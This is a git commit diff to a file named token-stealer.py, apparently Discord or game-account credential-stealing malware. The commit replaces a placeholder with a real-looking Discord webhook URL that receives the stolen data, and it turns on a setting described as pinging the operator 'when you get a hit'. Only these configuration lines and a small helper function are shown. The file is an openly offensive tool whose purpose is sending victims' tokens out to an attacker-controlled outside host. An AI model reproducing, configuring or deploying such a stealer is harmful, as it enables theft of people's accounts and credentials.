e2e124761e712778c6f6be2675c243678151cf7f
Pokfan <94008215+Pokfan@users.noreply.github.com>
2021-11-09 20:47:39 +0300

    Update token-stealer.py

--- token-stealer.py
+++ token-stealer.py
@@ -3,10 +3,10 @@ import os
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "https://discord.com/api/webhooks/907684947609931777/PfHMUoySwZiNnjhwITTeaZBbbRu4mgY0VSIyM7bcxwvn8D26TkDvpSNavcc02I2T7jJC"
 
 # mentions you when you get a hit
-PING_ME = False
+PING_ME = True
 
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
